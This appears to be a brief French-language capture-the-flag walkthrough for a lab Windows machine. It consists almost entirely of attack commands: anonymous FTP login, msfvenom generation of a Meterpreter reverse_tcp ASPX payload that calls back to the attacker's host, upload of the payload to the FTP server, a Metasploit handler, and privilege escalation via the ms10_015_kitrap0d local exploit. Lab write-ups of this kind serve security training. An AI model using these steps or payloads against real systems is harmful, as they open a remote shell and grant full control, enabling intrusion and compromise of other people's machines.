Windows


ftp :
	ftp anonymous@10.129.95.88 	
	
Génration du fichier exploit 
	msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86   LHOST=10.10.14.75 LPORT=12345 -f aspx > devel.aspx

il faut mettre l'exploit dans le serveur ftp.


puis dans msfconsole : 
	use multi/handler
	set payload windows/meterpreter/reverse_tcp
	set LHOST 10.10.14.75
	set LPORT 12345
	exploit -j



trouver un moyer de passer root :
	use post/multi/recon/local_exploit_suggester
	set SESSION 1
	run

	use exploit/windows/local/ms10_015_kitrap0d
	set SESSION 1
	set LHOST 10.10.14.75
	set LPORT 12345
	run
